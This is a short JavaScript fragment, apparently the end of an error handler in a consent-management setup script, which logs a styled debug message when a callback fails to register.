  window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error while setting up callback for CMP:", err);
}